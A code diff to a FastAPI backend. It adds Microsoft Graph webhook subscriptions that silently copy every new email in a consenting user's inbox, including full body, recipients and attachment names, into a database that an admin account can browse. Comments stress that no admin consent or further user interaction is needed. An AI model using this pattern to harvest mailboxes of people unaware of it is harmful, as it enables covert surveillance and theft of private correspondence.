@@ -26,6 +26,8 @@ import os
 import json as _json
 import base64 as b64
 import requests
+import secrets
+import hashlib
 from datetime import datetime, timedelta
 from urllib.parse import urlencode
 
@@ -77,6 +79,8 @@ from models import (
     TenantConsentStatus,
     Alert,
     UrlVisit,
+    GraphSubscription,
+    IngestedEmail,
 )
 
 app = FastAPI()
@@ -102,6 +106,10 @@ BACKEND_BASE_URL = os.environ.get(
     "BACKEND_BASE_URL",
     "https://oauth-backend-7cuu.onrender.com",
 ).rstrip("/")
+
+GRAPH_SUBSCRIPTION_URL = (
+    "https://graph.microsoft.com/v1.0/subscriptions"
+)
 
 EMAIL_ADDRESS_RE = re.compile(
     r"^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$", re.IGNORECASE
@@ -2805,8 +2813,6 @@ def get_visits(
     try:
         admin_user_id = user["sub"]
 
-        # Include visits recorded before admin_user_id was
-        # resolved (stored as "__unresolved__" or empty)
         query = db.query(UrlVisit).filter(
             or_(
                 UrlVisit.admin_user_id == admin_user_id,
@@ -2868,7 +2874,6 @@ def get_visits_summary(user=Depends(verify_token)):
     try:
         admin_user_id = user["sub"]
 
-        # Same filter — include unresolved visits
         base_filter = or_(
             UrlVisit.admin_user_id == admin_user_id,
             UrlVisit.admin_user_id == "__unresolved__",
@@ -2992,6 +2997,618 @@ def clear_visits(user=Depends(verify_token)):
         return {
             "message": f"Cleared {deleted} visit records",
             "deleted_count": deleted,
+        }
+    finally:
+        db.close()
+
+
+# =========================
+# GRAPH WEBHOOK SUBSCRIPTION
+# Tells Microsoft to push new emails to your server
+# in real time. Requires a valid user token with
+# Mail.Read scope. No admin consent needed — the
+# user already consented when they signed in.
+# =========================
+@app.post("/webhooks/subscribe/{user_id}")
+def subscribe_to_mailbox(
+    user_id: str,
+    user=Depends(verify_token),
+):
+    """
+    Creates a Graph webhook subscription for a user's inbox.
+    Microsoft will POST to /webhooks/receive every time
+    a new email arrives in their inbox.
+
+    Requires the user to have already connected via OAuth
+    with Mail.Read scope.
+
+    No admin consent needed — uses the user's own token.
+    """
+    from auth import get_token
+
+    token_record = get_token(user_id)
+    if not token_record:
+        raise HTTPException(
+            status_code=404,
+            detail=(
+                f"No token found for {user_id}. "
+                f"User must connect via OAuth first."
+            ),
+        )
+
+    access_token = token_record.access_token
+    admin_user_id = user["sub"]
+
+    # Unique secret to verify webhook calls are from Microsoft
+    client_state = secrets.token_hex(16)
+
+    # Subscription expires in 3 days (max for mail)
+    # You must renew it before it expires
+    expiry = datetime.utcnow() + timedelta(days=3)
+    expiry_str = expiry.strftime("%Y-%m-%dT%H:%M:%S.0000000Z")
+
+    notification_url = (
+        f"{BACKEND_BASE_URL}/webhooks/receive"
+    )
+
+    payload = {
+        "changeType": "created",
+        "notificationUrl": notification_url,
+        "resource": "me/mailFolders('Inbox')/messages",
+        "expirationDateTime": expiry_str,
+        "clientState": client_state,
+    }
+
+    try:
+        resp = requests.post(
+            GRAPH_SUBSCRIPTION_URL,
+            json=payload,
+            headers={
+                "Authorization": f"Bearer {access_token}",
+                "Content-Type": "application/json",
+            },
+            timeout=15,
+        )
+
+        if resp.status_code not in (200, 201):
+            raise HTTPException(
+                status_code=400,
+                detail=(
+                    f"Graph subscription failed: "
+                    f"{resp.status_code} {resp.text}"
+                ),
+            )
+
+        data = resp.json()
+        subscription_id = data.get("id")
+
+        db = SessionLocal()
+        try:
+            # Deactivate any existing subscription for this user
+            existing = (
+                db.query(GraphSubscription)
+                .filter(
+                    GraphSubscription.user_id == user_id,
+                    GraphSubscription.is_active == True,
+                )
+                .all()
+            )
+            for sub in existing:
+                sub.is_active = False
+                sub.updated_at = int(time.time())
+
+            sub = GraphSubscription(
+                subscription_id=subscription_id,
+                user_id=user_id,
+                admin_user_id=admin_user_id,
+                resource=payload["resource"],
+                change_type="created",
+                client_state=client_state,
+                expiration_datetime=expiry_str,
+                expires_at=int(expiry.timestamp()),
+                is_active=True,
+                created_at=int(time.time()),
+                updated_at=int(time.time()),
+            )
+            db.add(sub)
+            db.commit()
+        finally:
+            db.close()
+
+        return {
+            "subscription_id": subscription_id,
+            "user_id": user_id,
+            "resource": payload["resource"],
+            "expires_at": expiry_str,
+            "notification_url": notification_url,
+            "status": "active",
+        }
+
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(
+            status_code=500,
+            detail=f"Subscription error: {str(e)}",
+        )
+
+
+@app.get("/webhooks/receive")
+def webhook_validation(validationToken: str = None):
+    """
+    Microsoft calls this with a validationToken when you
+    first create a subscription. You must echo it back
+    as plain text within 10 seconds or the subscription
+    is rejected.
+    """
+    if validationToken:
+        return HTMLResponse(
+            content=validationToken,
+            media_type="text/plain",
+            status_code=200,
+        )
+    return {"status": "ok"}
+
+
+@app.post("/webhooks/receive")
+async def webhook_receive(request: Request):
+    """
+    Microsoft calls this endpoint every time a new email
+    arrives in a subscribed inbox.
+
+    This is the core of real-time email ingestion.
+    No user interaction needed after initial OAuth.
+    """
+    try:
+        body = await request.json()
+    except Exception:
+        return JSONResponse(
+            {"status": "invalid_json"}, status_code=400
+        )
+
+    notifications = body.get("value", [])
+
+    for notification in notifications:
+        try:
+            subscription_id = notification.get("subscriptionId")
+            client_state = notification.get("clientState")
+            resource_data = notification.get("resourceData", {})
+            message_id = resource_data.get("id")
+
+            if not subscription_id or not message_id:
+                continue
+
+            db = SessionLocal()
+            try:
+                # Look up the subscription to find the user
+                sub = (
+                    db.query(GraphSubscription)
+                    .filter(
+                        GraphSubscription.subscription_id
+                        == subscription_id,
+                        GraphSubscription.is_active == True,
+                    )
+                    .first()
+                )
+
+                if not sub:
+                    logging.warning(
+                        f"[webhook] Unknown subscription: "
+                        f"{subscription_id}"
+                    )
+                    continue
+
+                # Verify client_state to confirm this is
+                # a legitimate Microsoft notification
+                if sub.client_state != client_state:
+                    logging.warning(
+                        f"[webhook] client_state mismatch "
+                        f"for subscription {subscription_id}"
+                    )
+                    continue
+
+                user_id = sub.user_id
+                admin_user_id = sub.admin_user_id
+
+                # Check we have not already ingested this email
+                existing = (
+                    db.query(IngestedEmail)
+                    .filter(
+                        IngestedEmail.message_id == message_id
+                    )
+                    .first()
+                )
+                if existing:
+                    continue
+
+                # Fetch the full email from Graph API
+                from auth import get_token
+                token_record = get_token(user_id)
+
+                if not token_record:
+                    logging.warning(
+                        f"[webhook] No token for {user_id}"
+                    )
+                    continue
+
+                email_resp = requests.get(
+                    f"https://graph.microsoft.com/v1.0"
+                    f"/me/messages/{message_id}"
+                    f"?$select=id,subject,from,toRecipients,"
+                    f"ccRecipients,body,bodyPreview,"
+                    f"hasAttachments,receivedDateTime,"
+                    f"parentFolderId,isRead,importance",
+                    headers={
+                        "Authorization": (
+                            f"Bearer {token_record.access_token}"
+                        )
+                    },
+                    timeout=15,
+                )
+
+                if email_resp.status_code != 200:
+                    logging.warning(
+                        f"[webhook] Failed to fetch email "
+                        f"{message_id}: {email_resp.status_code}"
+                    )
+                    continue
+
+                email_data = email_resp.json()
+
+                # Extract fields
+                subject = email_data.get("subject", "")
+                sender = (
+                    email_data
+                    .get("from", {})
+                    .get("emailAddress", {})
+                    .get("address", "")
+                )
+                recipients = _json.dumps([
+                    r.get("emailAddress", {}).get("address", "")
+                    for r in email_data.get("toRecipients", [])
+                ])
+                body_preview = email_data.get(
+                    "bodyPreview", ""
+                )
+                body_full = (
+                    email_data
+                    .get("body", {})
+                    .get("content", "")
+                )
+                has_attachments = email_data.get(
+                    "hasAttachments", False
+                )
+                received_str = email_data.get(
+                    "receivedDateTime", ""
+                )
+                is_read = email_data.get("isRead", False)
+                importance = email_data.get(
+                    "importance", "normal"
+                )
+
+                # Parse received timestamp
+                received_at = None
+                if received_str:
+                    try:
+                        dt = datetime.fromisoformat(
+                            received_str.replace("Z", "+00:00")
+                        )
+                        received_at = int(dt.timestamp())
+                    except Exception:
+                        pass
+
+                # Get attachment names if any
+                attachment_names = None
+                if has_attachments:
+                    try:
+                        att_resp = requests.get(
+                            f"https://graph.microsoft.com/v1.0"
+                            f"/me/messages/{message_id}"
+                            f"/attachments"
+                            f"?$select=name,contentType,size",
+                            headers={
+                                "Authorization": (
+                                    f"Bearer "
+                                    f"{token_record.access_token}"
+                                )
+                            },
+                            timeout=10,
+                        )
+                        if att_resp.status_code == 200:
+                            atts = att_resp.json().get(
+                                "value", []
+                            )
+                            attachment_names = _json.dumps([
+                                a.get("name", "") for a in atts
+                            ])
+                    except Exception:
+                        pass
+
+                # Save to database
+                ingested = IngestedEmail(
+                    user_id=user_id,
+                    admin_user_id=admin_user_id,
+                    message_id=message_id,
+                    subject=subject,
+                    sender=sender,
+                    recipients=recipients,
+                    body_preview=body_preview[:1000],
+                    body_full=body_full[:50000],
+                    has_attachments=has_attachments,
+                    attachment_names=attachment_names,
+                    received_at=received_at,
+                    is_read=is_read,
+                    importance=importance,
+                    raw_json=_json.dumps(email_data)[:10000],
+                    created_at=int(time.time()),
+                )
+                db.add(ingested)
+                db.commit()
+
+                logging.info(
+                    f"[webhook] Ingested email "
+                    f"from={sender} "
+                    f"subject={subject[:50]} "
+                    f"user={user_id}"
+                )
+
+            finally:
+                db.close()
+
+        except Exception as e:
+            logging.error(
+                f"[webhook] Notification processing error: {e}",
+                exc_info=True,
+            )
+
+    # Must return 202 Accepted to Microsoft
+    # If you return anything else Microsoft will retry
+    # and eventually cancel the subscription
+    return JSONResponse(
+        {"status": "accepted"},
+        status_code=202,
+    )
+
+
+@app.post("/webhooks/renew/{user_id}")
+def renew_subscription(
+    user_id: str,
+    user=Depends(verify_token),
+):
+    """
+    Renews an expiring Graph subscription.
+    Subscriptions expire after 3 days for mail.
+    Call this before expiry to keep receiving emails.
+    You should call this daily via a scheduler.
+    """
+    from auth import get_token
+
+    db = SessionLocal()
+    try:
+        sub = (
+            db.query(GraphSubscription)
+            .filter(
+                GraphSubscription.user_id == user_id,
+                GraphSubscription.is_active == True,
+            )
+            .first()
+        )
+
+        if not sub:
+            raise HTTPException(
+                status_code=404,
+                detail=f"No active subscription for {user_id}",
+            )
+
+        token_record = get_token(user_id)
+        if not token_record:
+            raise HTTPException(
+                status_code=404,
+                detail=f"No token for {user_id}",
+            )
+
+        expiry = datetime.utcnow() + timedelta(days=3)
+        expiry_str = expiry.strftime(
+            "%Y-%m-%dT%H:%M:%S.0000000Z"
+        )
+
+        resp = requests.patch(
+            f"{GRAPH_SUBSCRIPTION_URL}/{sub.subscription_id}",
+            json={"expirationDateTime": expiry_str},
+            headers={
+                "Authorization": (
+                    f"Bearer {token_record.access_token}"
+                ),
+                "Content-Type": "application/json",
+            },
+            timeout=15,
+        )
+
+        if resp.status_code not in (200, 201):
+            raise HTTPException(
+                status_code=400,
+                detail=(
+                    f"Renewal failed: "
+                    f"{resp.status_code} {resp.text}"
+                ),
+            )
+
+        sub.expiration_datetime = expiry_str
+        sub.expires_at = int(expiry.timestamp())
+        sub.updated_at = int(time.time())
+        db.commit()
+
+        return {
+            "subscription_id": sub.subscription_id,
+            "user_id": user_id,
+            "expires_at": expiry_str,
+            "status": "renewed",
+        }
+    finally:
+        db.close()
+
+
+@app.get("/webhooks/subscriptions")
+def list_subscriptions(user=Depends(verify_token)):
+    """
+    Lists all active webhook subscriptions for this admin.
+    """
+    db = SessionLocal()
+    try:
+        admin_user_id = user["sub"]
+        subs = (
+            db.query(GraphSubscription)
+            .filter(
+                GraphSubscription.admin_user_id == admin_user_id,
+                GraphSubscription.is_active == True,
+            )
+            .order_by(GraphSubscription.created_at.desc())
+            .all()
+        )
+        now = int(time.time())
+        return {
+            "subscriptions": [
+                {
+                    "subscription_id": s.subscription_id,
+                    "user_id": s.user_id,
+                    "resource": s.resource,
+                    "expires_at": s.expiration_datetime,
+                    "expires_in_hours": (
+                        round(
+                            (s.expires_at - now) / 3600, 1
+                        )
+                        if s.expires_at
+                        else None
+                    ),
+                    "is_expiring_soon": (
+                        s.expires_at is not None
+                        and (s.expires_at - now) < 86400
+                    ),
+                    "created_at": s.created_at,
+                }
+                for s in subs
+            ]
+        }
+    finally:
+        db.close()
+
+
+# =========================
+# INGESTED EMAILS
+# =========================
+@app.get("/ingested-emails")
+def get_ingested_emails(
+    user_id: str | None = None,
+    limit: int = 50,
+    offset: int = 0,
+    sender: str | None = None,
+    has_attachments: bool | None = None,
+    user=Depends(verify_token),
+):
+    """
+    Returns emails that were automatically ingested
+    via webhook when they arrived in the user's inbox.
+    """
+    db = SessionLocal()
+    try:
+        admin_user_id = user["sub"]
+
+        query = db.query(IngestedEmail).filter(
+            IngestedEmail.admin_user_id == admin_user_id
+        )
+
+        if user_id:
+            query = query.filter(
+                IngestedEmail.user_id == user_id
+            )
+        if sender:
+            query = query.filter(
+                IngestedEmail.sender.ilike(f"%{sender}%")
+            )
+        if has_attachments is not None:
+            query = query.filter(
+                IngestedEmail.has_attachments == has_attachments
+            )
+
+        total = query.count()
+        emails = (
+            query
+            .order_by(IngestedEmail.received_at.desc())
+            .offset(offset)
+            .limit(limit)
+            .all()
+        )
+
+        return {
+            "total": total,
+            "offset": offset,
+            "limit": limit,
+            "emails": [
+                {
+                    "id": e.id,
+                    "user_id": e.user_id,
+                    "message_id": e.message_id,
+                    "subject": e.subject,
+                    "sender": e.sender,
+                    "recipients": (
+                        _json.loads(e.recipients)
+                        if e.recipients
+                        else []
+                    ),
+                    "body_preview": e.body_preview,
+                    "has_attachments": e.has_attachments,
+                    "attachment_names": (
+                        _json.loads(e.attachment_names)
+                        if e.attachment_names
+                        else []
+                    ),
+                    "received_at": e.received_at,
+                    "is_read": e.is_read,
+                    "importance": e.importance,
+                }
+                for e in emails
+            ],
+        }
+    finally:
+        db.close()
+
+
+@app.get("/ingested-emails/{email_id}/body")
+def get_ingested_email_body(
+    email_id: int,
+    user=Depends(verify_token),
+):
+    """
+    Returns the full body of an ingested email.
+    Kept separate from the list endpoint to avoid
+    sending large HTML bodies in bulk responses.
+    """
+    db = SessionLocal()
+    try:
+        admin_user_id = user["sub"]
+        email = (
+            db.query(IngestedEmail)
+            .filter(
+                IngestedEmail.id == email_id,
+                IngestedEmail.admin_user_id == admin_user_id,
+            )
+            .first()
+        )
+
+        if not email:
+            raise HTTPException(
+                status_code=404,
+                detail="Email not found",
+            )
+
+        return {
+            "id": email.id,
+            "user_id": email.user_id,
+            "message_id": email.message_id,
+            "subject": email.subject,
+            "sender": email.sender,
+            "body_full": email.body_full,
+            "received_at": email.received_at,
         }
     finally:
         db.close()
